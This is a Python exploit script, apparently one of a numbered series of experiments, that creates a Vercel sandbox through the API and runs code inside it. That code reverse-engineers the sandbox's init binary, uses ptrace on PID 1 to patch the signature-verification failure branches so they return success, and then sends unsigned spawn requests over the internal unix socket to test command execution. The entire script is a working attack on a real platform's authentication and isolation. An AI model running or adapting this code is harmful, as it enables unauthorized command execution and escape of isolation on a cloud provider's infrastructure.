# 实验J61: 完整 patch 验证函数所有失败分支 (清零寄存器+恢复栈帧+ret)
# 关键: Go 寄存器 ABI 返回值在 rax/rbx (error interface), 需与函数栈帧匹配
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj61"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, struct, subprocess, json, time, ctypes, base64

b = open("/run/vercel/share/sandbox-init", "rb").read()

print("===== [1] 函数入口 dump =====", flush=True)
# 函数A入口 0x43b3af (invalid signature + missing timestamp), 函数B入口 0x42a7af (missing required)
for name, fo in [("funcA(verify)", 0x43b3af), ("funcB(required)", 0x42a7af)]:
    print("=== %s @ %s ===" % (name, hex(fo)), flush=True)
    print("head: %s" % b[fo:fo+96].hex(), flush=True)

print("===== [2] 找 missing signature header 的引用 (扩展模式) =====", flush=True)
STR = 0x9f60f1  # "missing signature header" va
def find_all_refs(str_va):
    hits = []
    for m in re.finditer(rb"\x48\x8d[\x05\x0d\x15\x1d\x25\x2d\x35\x3d](.{4})", b):
        disp = struct.unpack("<i", m.group(1))[0]
        tgt = m.start() + 0x400000 + len(m.group(0)) + disp
        if tgt == str_va:
            hits.append(("lea48", m.start()))
    for m in re.finditer(rb"\x4c\x8d[\x05\x0d\x15\x1d\x25\x2d\x35\x3d](.{4})", b):
        disp = struct.unpack("<i", m.group(1))[0]
        tgt = m.start() + 0x400000 + len(m.group(0)) + disp
        if tgt == str_va:
            hits.append(("lea4c", m.start()))
    # mov rax, imm32 (48 c7 c0 xx xx xx xx)
    for m in re.finditer(rb"\x48\xc7\xc0(.{4})", b):
        imm = struct.unpack("<I", m.group(1))[0]
        if imm == str_va:
            hits.append(("mov32", m.start()))
    # mov rax, imm64 (48 b8)
    for m in re.finditer(rb"\x48\xb8(.{8})", b):
        imm = struct.unpack("<Q", m.group(1))[0]
        if imm == str_va:
            hits.append(("mov64", m.start()))
    # 直接搜 imm32 出现位置
    pat = struct.pack("<I", str_va)
    for m in re.finditer(re.escape(pat), b):
        pre = b[max(0, m.start()-4):m.start()]
        hits.append(("raw-imm32", m.start(), pre.hex()))
    return hits

hits = find_all_refs(STR)
print("refs for missing-sig-header:", hits, flush=True)

print("===== [3] dump 候选引用点上下文 =====", flush=True)
for h in hits:
    if h[0] == "raw-imm32":
        fo = h[1]
    else:
        fo = h[1]
    print("=== %s @ %s ===" % (h[0], hex(fo)), flush=True)
    print("prev: %s" % b[max(0, fo-48):fo].hex(), flush=True)
    print("ctx:  %s" % b[fo:fo+80].hex(), flush=True)

print("===== [4] 反汇编帮助: 0x43b3af 函数体前 400 字节 =====", flush=True)
# 找所有 5 字节 call e8 xx xx xx xx
def simple_disasm(fo, n):
    out = []
    i = fo
    end = fo + n
    while i < end:
        byte = b[i]
        if byte == 0xe8 and i + 5 <= end:  # call rel32
            rel = struct.unpack("<i", b[i+1:i+5])[0]
            out.append(("%08x" % (i + 0x400000), "call %+d -> %s" % (rel, hex(i + 5 + rel + 0x400000))))
            i += 5
        elif byte == 0xe9 and i + 5 <= end:  # jmp rel32
            rel = struct.unpack("<i", b[i+1:i+5])[0]
            out.append(("%08x" % (i + 0x400000), "jmp %+d -> %s" % (rel, hex(i + 5 + rel + 0x400000))))
            i += 5
        elif byte == 0x0f and i + 6 <= end and b[i+1] in (0x84, 0x85, 0x8f, 0x8e):  # jcc rel32
            rel = struct.unpack("<i", b[i+2:i+6])[0]
            out.append(("%08x" % (i + 0x400000), "j%s %+d -> %s" % (b[i+1], rel, hex(i + 6 + rel + 0x400000))))
            i += 6
        elif byte == 0x48 and i + 4 <= end and b[i+1] == 0x83 and b[i+2] == 0xec:
            out.append(("%08x" % (i + 0x400000), "sub rsp, %d" % b[i+3]))
            i += 4
        elif byte == 0x48 and i + 4 <= end and b[i+1] == 0x81 and b[i+2] == 0xec:
            imm = struct.unpack("<I", b[i+3:i+7])[0]
            out.append(("%08x" % (i + 0x400000), "sub rsp, %s" % hex(imm)))
            i += 7
        elif byte == 0x55:
            out.append(("%08x" % (i + 0x400000), "push rbp"))
            i += 1
        elif byte == 0x5d:
            out.append(("%08x" % (i + 0x400000), "pop rbp"))
            i += 1
        elif byte == 0xc3:
            out.append(("%08x" % (i + 0x400000), "ret"))
            i += 1
        elif byte == 0x74 and i + 2 <= end:  # jz rel8
            rel = struct.unpack("b", b[i+1:i+2])[0]
            out.append(("%08x" % (i + 0x400000), "jz %+d -> %s" % (rel, hex(i + 2 + rel + 0x400000))))
            i += 2
        elif byte == 0x75 and i + 2 <= end:  # jnz rel8
            rel = struct.unpack("b", b[i+1:i+2])[0]
            out.append(("%08x" % (i + 0x400000), "jnz %+d -> %s" % (rel, hex(i + 2 + rel + 0x400000))))
            i += 2
        else:
            i += 1
    return out

for name, fo in [("funcA", 0x43b3af), ("funcB", 0x42a7af)]:
    print("=== %s disasm ===" % name, flush=True)
    for a, d in simple_disasm(fo, 700):
        print("  %s: %s" % (a, d), flush=True)

print("===== [5] patch 所有失败分支 =====", flush=True)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long
libc.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
libc.waitpid.restype = ctypes.c_int

def ptrace_rw(addr, data=None, read_len=0):
    libc.ptrace(16, 1, None, None)
    wp = libc.waitpid(1, None, 0)
    if wp != 1:
        libc.ptrace(17, 1, None, None)
        return -1, "waitpid=%d" % wp
    if data is not None:
        PTRACE_POKEDATA = 5
        ok = 0
        total = (len(data) + 7) // 8
        for off in range(0, len(data), 8):
            word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
            r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
            if r == 0:
                ok += 1
        libc.ptrace(17, 1, None, None)
        return ok, total
    else:
        PTRACE_PEEKDATA = 4
        out = b""
        off = 0
        while off < read_len:
            v = libc.ptrace(PTRACE_PEEKDATA, 1, addr + off, None)
            if v == -1:
                break
            out += (v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
            off += 8
        libc.ptrace(17, 1, None, None)
        return len(out), out

# funcA: 失败分支在 0x83b571 (栈帧 0xd0) 和 0x83b5af
# patch: xor eax,eax; xor ebx,ebx; add rsp,0xd0; pop rbp; ret
PATCH_A = bytes.fromhex("31c031db4881c4d00000005dc3")
for va in [0x83b571, 0x83b5af]:
    ok, total = ptrace_rw(va, data=PATCH_A)
    print("PATCH A @ %s: %d/%d" % (hex(va), ok, total), flush=True)
# funcB: 0x42a9f9 (栈帧 0x90)
PATCH_B = bytes.fromhex("31c031db4881c4900000005dc3")
ok, total = ptrace_rw(0x82a9f9, data=PATCH_B)
print("PATCH B @ 0x82a9f9: %d/%d" % (ok, total), flush=True)

print("===== [6] 测试 =====", flush=True)
def ccall(path, body, hdrs, timeout=10):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: application/connect+json",
           "-H", "Connect-Protocol-Version: 1"]
    for k, v in hdrs.items():
        cmd += ["-H", "%s: %s" % (k, v)]
    cmd += ["-d", body, "http://localhost" + path]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return r.stdout
    except Exception as e:
        return "EXC " + str(e)

ts = str(int(time.time() * 1000))
for label, hdrs in [
    ("no-sig", {}),
    ("random-sig", {"x-timestamp": ts, "x-signature": base64.b64encode(b"\x99" * 64).decode()}),
]:
    out = ccall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", '{"command":"id"}', hdrs)
    print("[%s] %s" % (label, out[:1000].replace("\r\n", " | ")), flush=True)
'''
run_cmd(sid, SCAN, "patch-all-fail-branches", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
